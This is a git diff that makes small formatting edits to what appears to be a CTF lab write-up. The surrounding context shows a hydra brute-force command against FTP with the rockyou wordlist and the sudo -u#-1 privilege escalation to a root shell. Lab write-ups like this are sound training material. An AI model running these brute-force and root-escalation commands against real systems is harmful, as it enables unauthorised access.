@@ -31,7 +31,7 @@ Bruteforcing using hydra `hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp
 > password - XXXXXXX
 
 Now we know the password, we can login through FTP
-using an ls command we can see all the files in the FTP server
+Using an ls command we can see all the files in the FTP server
 ```
 -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
 -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
@@ -87,6 +87,3 @@ called “sudoers”, which helps ensure that privileges are limited only to spe
 (source:whitesourcesoftware)
 ```
 Got the root shell using `sudo -u#-1 /bin/bash` and we got our root flag in `/root/root.txt`
-
-
-
